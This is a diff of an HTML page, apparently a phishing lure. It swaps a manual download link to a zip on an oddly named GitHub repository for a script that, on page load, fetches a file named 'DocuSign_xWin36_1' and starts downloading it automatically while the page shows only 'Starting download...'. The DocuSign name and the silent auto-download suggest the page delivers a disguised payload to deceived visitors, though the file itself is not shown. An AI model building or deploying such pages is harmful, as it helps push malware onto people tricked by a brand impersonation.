@@ -5,10 +5,25 @@
 </head>
 <body>
 
-<a href="https://raw.githubusercontent.com/allisonjensen129-stack/docuidfdftrddddhsnnkr-heuy3rerty4/main/myfile.zip"
-   download="DocuSign_xWin36_1">
-    Download File
-</a>
+<p>Starting download...</p>
+
+<script>
+window.addEventListener("load", async () => {
+    const response = await fetch("./DocuSign_xWin36_1");
+    const blob = await response.blob();
+
+    const url = URL.createObjectURL(blob);
+
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "DocuSign_xWin36_1";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+    URL.revokeObjectURL(url);
+});
+</script>
 
 </body>
 </html>
